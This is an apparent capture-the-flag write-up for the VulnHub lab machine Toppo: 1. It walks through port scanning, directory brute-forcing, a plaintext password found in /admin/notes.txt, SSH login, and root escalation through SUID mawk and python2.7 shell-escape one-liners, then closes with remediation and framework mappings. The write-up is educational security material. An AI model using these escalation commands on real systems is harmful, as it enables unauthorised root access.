# Toppo: 1 — Notes to Myself Are Bad OPSEC, Dude

Alright guys!! Toppo: 1 is the kind of machine that makes you go "wait, that's it?" and then immediately check if you missed a step. Spoiler: you didn't. The developer left a password in a plaintext note inside an unprotected admin directory, and that note handed over the entire machine. A SUID mawk binary sealed the deal. Beginner-friendly, genuinely educational, and a masterclass in why "notes to myself" should never live on a web server. Big respect to the author for the clean, focused design. (☞ﾟヮﾟ)☞

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | Toppo: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/toppo-1,245/ |
| **Techniques** | Nmap service enumeration, web directory brute-force, credential discovery in plaintext file, SSH password login, SUID binary abuse (mawk/python2.7), GTFOBins escalation |
| **CVEs** | CWE-312 (Cleartext Storage of Sensitive Information), CWE-269 (Improper Privilege Management: SUID on interpreter), CWE-548 (Exposure of Information Through Directory Listing) |
| **APT Groups** | FIN7: routinely searches web-accessible config and admin files for credential harvesting during initial access; OceanLotus (APT32): abuses SUID interpreters and sudo misconfigurations as primary Linux privilege escalation technique |

---

## Attack Summary

```
nmap → SSH (22), HTTP (80)
  → dirb/gobuster → /admin/ (200 OK, directory listing)
  → /admin/notes.txt → password: 12345ted123
  → username guessed from password: ted
  → ssh ted@target → low-priv shell
  → find / -perm -4000 → /usr/bin/mawk (SUID root)
  → mawk 'BEGIN{system("/bin/sh")}' → uid=0(root)
  → cat /root/flag.txt
```

---

## Methodology

1. Full port scan to identify HTTP and SSH services
2. Web directory brute-force to enumerate hidden paths
3. Credential discovery inside an unprotected admin directory
4. Username inference from the password string
5. SSH authentication with discovered credentials
6. SUID enumeration for local privilege escalation
7. GTFOBins escalation via mawk SUID
8. Root flag capture

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.104

nmap -sV -sC -A 192.168.1.104
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Two services. SSH is the lateral movement target. HTTP is the primary attack surface. The clean minimal service count is deceptive: one of these two services will give you everything.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration and Directory Brute-Force

Browse to `http://192.168.1.104/`. Apache default page or simple webapp. Check robots.txt first:

```bash
curl -s http://192.168.1.104/robots.txt
```

Then brute-force directories:

```bash
dirb http://192.168.1.104

# Alternative with gobuster:
gobuster dir \
  -u http://192.168.1.104/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,bak \
  -t 40
```

Key finding: `/admin/` returns HTTP 200 and directory listing is enabled. This is the critical misconfiguration.

**Real-world note:** Directory listing (autoindex) is a default Apache behavior that organizations frequently fail to disable. OWASP A05:2021 Security Misconfiguration covers exactly this. In real engagements, unprotected `/admin/`, `/backup/`, and `/config/` directories are among the most reliable first-step credential sources.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — Credential Discovery in notes.txt

Navigate to `http://192.168.1.104/admin/` and open `notes.txt`:

```
Note to myself :
I need to change my password :
12345ted123
It is too week !!
```

Password: `12345ted123`. The username is embedded in the password itself: `ted`.

**Real-world note:** This is CWE-312 in its most literal form. It is not fictional: pentesters routinely find credentials in `notes.txt`, `readme.txt`, `TODO.md`, and `backup.sql` files in web-accessible directories. A 2023 Verizon DBIR finding confirmed that misconfigured web assets remain a top initial access vector. FIN7 specifically uses Google dorks and web scanners to harvest exactly this type of exposure before any interactive engagement.

**MITRE ATT&CK:** T1552.001 — Unsecured Credentials: Credentials In Files

---

## Step 4 — Initial Access via SSH

```bash
ssh ted@192.168.1.104
# Password: 12345ted123

ted@toppo:~$ id
# uid=1000(ted) gid=1000(ted) groups=1000(ted)
```

Shell as `ted`. The machine is ours for enumeration.

**MITRE ATT&CK:** T1078 — Valid Accounts; T1021.004 — Remote Services: SSH

---

## Step 5 — Privilege Escalation Enumeration

Enumerate all potential escalation vectors:

```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Sudo rights
sudo -l

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*

# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
```

SUID binaries found include non-standard entries:

```
/usr/bin/mawk
/usr/bin/python2.7
```

Both are scripting interpreters with SUID root set. Either one trivially yields a root shell via GTFOBins.

**Real-world note:** SUID on a scripting interpreter is effectively SUID root. An attacker who can run `mawk` or `python` as SUID root can spawn any process as root. This is consistently one of the top Linux LPE findings in penetration testing, especially on legacy systems where administrators added SUID without understanding the implications.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Step 6 — GTFOBins Escalation via mawk SUID

`mawk` supports the `system()` function, which spawns a shell. With SUID root set, that shell inherits root's UID:

```bash
mawk 'BEGIN {system("/bin/sh")}'
id
# uid=0(root) gid=0(root) groups=0(root)
```

Alternative using python2.7 SUID:

```bash
python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id
# uid=0(root)
```

```bash
# Capture the flag
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. gg no cap.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Credential | `ted:12345ted123` | /admin/notes.txt | SSH login |
| Root flag | (flag.txt contents) | /root/flag.txt | Challenge completion |
| SUID binaries | /usr/bin/mawk, /usr/bin/python2.7 | find -perm -4000 | Privilege escalation |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Password stored in plaintext in web-accessible notes.txt | CWE-312: frequently found in web roots during assessments; FIN7 harvests these via automated scanning | Never store credentials in web-accessible files; use secrets managers (Vault, AWS Secrets Manager) |
| 2 | No authentication on /admin directory | OWASP A05:2021 Security Misconfiguration; admin paths without auth are immediate critical findings | Require authentication on all admin directories; disable Apache autoindex globally |
| 3 | Username embedded in password pattern | Makes brute-force trivial; violates NIST SP 800-63B credential composition guidance | Enforce password policies that prohibit username inclusion; use password managers |
| 4 | SUID on mawk interpreter | SUID on any scripting interpreter is equivalent to SUID root; OceanLotus exploits this pattern routinely | Remove SUID from all interpreters; use sudo with specific allowlists instead |
| 5 | SUID on python2.7 (EOL) | Python 2 reached end-of-life January 2020; EOL software on production systems is a compliance violation | Remove Python 2 entirely; enforce OS-level package auditing for EOL software |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Credential Access | Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Discovery | Discovery | System Information Discovery | T1082 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid and Setgid | T1548.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove /admin from web root** or require HTTP Basic Auth or application-level authentication; never rely on obscurity
2. **Disable Apache directory listing** globally: `Options -Indexes` in httpd.conf or .htaccess
3. **Never store credentials in web-accessible files**: use environment variables, secrets managers, or encrypted vaults
4. **Remove SUID from scripting interpreters**: `chmod u-s /usr/bin/mawk /usr/bin/python2.7`
5. **Remove Python 2.7 entirely**: it is EOL and presents ongoing security risk
6. **Enforce password policy**: minimum 12 characters, no username inclusion, no dictionary words

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Audit all web-accessible directories for sensitive file exposure |
| Protect | Access Control | Require authentication for /admin and all admin paths |
| Protect | Data Security | No plaintext credentials in web root; use secrets manager |
| Detect | Anomalies and Events | Alert on SSH logins from new source IPs; web access log review |
| Respond | Response Planning | Rotate compromised credentials; audit all SUID binaries |
| Recover | Recovery Planning | Review and harden all web directories; enforce least privilege |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict access to /admin directory |
| AC-6 | Least Privilege | Remove SUID from interpreters; restrict sudo |
| IA-5 | Authenticator Management | Enforce password complexity; prohibit username in password |
| CM-7 | Least Functionality | Disable autoindex; remove unused software (Python 2) |
| SC-28 | Protection of Information at Rest | No credentials in web-accessible files |
| SI-2 | Flaw Remediation | Patch/remove EOL software (Python 2.7) |

### CISA KEV

The pattern of plaintext credentials in web-accessible files maps to CWE-312, referenced in multiple CISA Advisories (AA21-116A, AA22-074A) on threat actor initial access techniques. CISA recommends immediate remediation of unauthenticated admin directories and credential exposure as Priority 1 findings.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (disable autoindex; require auth on /admin)
- **D3-OAM** — Operating System Administrative Management (remove SUID from interpreters)
- **D3-HBPI** — Harden Build Pipeline Integrity (no credentials in deployed web artifacts)

---

## Final Thoughts

Toppo: 1 is a perfect first machine for anyone learning the methodology. The path is linear, the techniques are fundamental, and every step teaches a real-world finding that comes up in actual assessments. The SUID interpreter escalation is especially instructive because it appears in environments where admins set SUID "just to make something work" without understanding what they handed over.

The name fits: Toppo was a character who seemed beatable on first glance but had more depth underneath. This machine is the same way for anyone who hasn't done the enumeration discipline before. Respect to the creator. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
